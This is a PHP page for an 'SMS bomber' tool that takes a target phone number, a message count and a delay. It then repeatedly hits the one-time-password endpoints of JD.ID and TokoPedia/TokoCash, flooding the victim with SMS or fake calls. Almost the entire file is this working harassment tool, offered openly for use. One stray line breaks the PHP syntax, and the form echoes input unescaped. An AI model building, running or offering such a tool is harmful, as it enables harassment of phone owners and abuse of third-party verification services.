<?php
/**
 * 
 *
 * @author Jlempar
 * @version v1.1
 * @copyright Organisation, default
 * @package default
 **/

/**
 * About FBS (Free Bomb Sms) *
 * Author : Afid Arifin
 * Version : v1.1
 * Realease as : Free
 * On : 27 July 2018
 **/
 
error_reporting(0);

require 'includes/functions.php';

$title = 'Free Bomb SMS';
require 'includes/header.php';

echo '<div class="title">Free Bomb Sms</div>';

if(isset($_POST['submitted'])) {
	
	//first configuration and selected operator
	$phone = strip_tags($_POST['phone']); //targeted phone number
	$total = strip_tags($_POST['total']); //total send
	$delay = strip_tags($_POST['delay']); //delay or waiting time
	$selected = strip_tags($_POST['selected']);
	$errors = array();
	
	//checking validation
	if(empty($phone) || empty($total) || empty($delay)) {
		$errors[] = '<font color="red">Sorry! you must inserted all field!</font>';
	} elseif(!is_numeric($phone) || strlen($phone) > 12) {
		$errors[] = '<font color="red">Invalid phone number!</font>';
	} elseif(!is_numeric($total)) {
		$errors[] = '<font color="red">Invalid total bomb!</font>';
	} elseif(!is_numeric($delay)) {
		$errors[] = '<font color="red">Invalid delay!</font>';
	} elseif(empty($errors)) {
		
		if($selected == 'undefined') {
			*// (Add $protect  number option
  
			//if users no selected operator
			$errors[] = '<font color="red">You must selected operator!</font>';
		} elseif($selected == 'jdid') {
			//operator JD.ID
			$api = 'http://sc.jd.id/phone/sendPhoneSms';
			$reff = 'http://sc.jd.id/phone/bindingPhone.html';
			$mobile = 'phone='.$phone.'&smsType=1';
			
			//running bomb
			if(runBomb($mobile,$total,$delay,$api,$reff)) {
				
				$errors[] = '<font color="green">Successfully to bomb !</font>
				<table>
				<tr>
				<td><b>To</b></td>
				<td>:</td>
				<td>'.$phone.'</td>
				</tr>
				<tr>
				<td><b>Total</b></td>
				<td>:</td>
				<td>'.$total.' x in '.$delay.' seconds</td>
				</tr>
				</table>';
			} else {
				$errors[] = '<font color="red">Failed to bomb!</font>';
			}
		} elseif($selected == 'tokpedcall') {
			
			//operator TokoPedia (call fake)
			$api = 'https://www.tokocash.com/oauth/otp';
			$reff = $api;
			$mobile = 'msisdn='.$phone.'&accept=call';
			
			//running bomb
			if(runBomb($mobile,$total,$delay,$api,$reff)) {
				
				$errors[] = '<font color="green">Successfully to bomb !</font>
				<table>
				<tr>
				<td><b>To</b></td>
				<td>:</td>
				<td>'.$phone.'</td>
				</tr>
				<tr>
				<td><b>Total</b></td>
				<td>:</td>
				<td>'.$total.' x in '.$delay.' seconds</td>
				</tr>
				</table>';
			} else {
				$errors[] = '<font color="red">Failed to bomb!</font>';
			}
		} elseif($selected == 'tokpedsms') {
			
			//operator TokoPedia (sms)
			$api = 'https://www.tokocash.com/oauth/otp';
			$reff = $api;
			$mobile = 'msisdn='.$phone.'&accept=sms';
			
			//running bomb
			if(runBomb($mobile,$total,$delay,$api,$reff)) {
				
				$errors[] = '<font color="green">Successfully to bomb !</font>
				<table>
				<tr>
				<td><b>To</b></td>
				<td>:</td>
				<td>'.$phone.'</td>
				</tr>
				<tr>
				<td><b>Total</b></td>
				<td>:</td>
				<td>'.$total.' x in '.$delay.' seconds</td>
				</tr>
				</table>';
			} else {
				$errors[] = '<font color="red">Failed to bomb!</font>';
			}
		}
	}
} else {
	
	echo '<div class="content">
	Welcome Back In Here!. Use this tools as free bomb sms all!
	</div>';
}

//error handle
foreach($errors as $error) {
	echo '<div class="content2">';
	echo $error;
	echo '</div>';
}

echo '<div class="content">
<form method="POST">
<b>Phone Number :</b>
<br/>
<input name="phone" type="number" value="'.$phone.'" placeholder="08xxx..." class="search"/>
<br/>
<b>Total :</b>
<br/>
<input name="total" type="number" value="'.$total.'" placeholder="100" class="search"/>
<br/>
<b>Delay (ex. 60 in seconds) :</b>
<br/>
<input name="delay" type="number" value="'.$delay.'" placeholder="60" class="search"/>
<br/>
<b>Operator :</b>
<br/>
<select name="selected" class="search">
<option value="undefined">Select Operator</option>
<option value="jdid">JD.ID</option>
<option value="tokpedcall">TokoPedia (CALL)</option>
<option value="tokpedsms">TokoPedia (SMS)</option>
</select>
<br/>
<input name="submitted" type="submit" value="Action Bomb" class="submit"/>
</form>
</div>';

require 'includes/footer.php';
?>
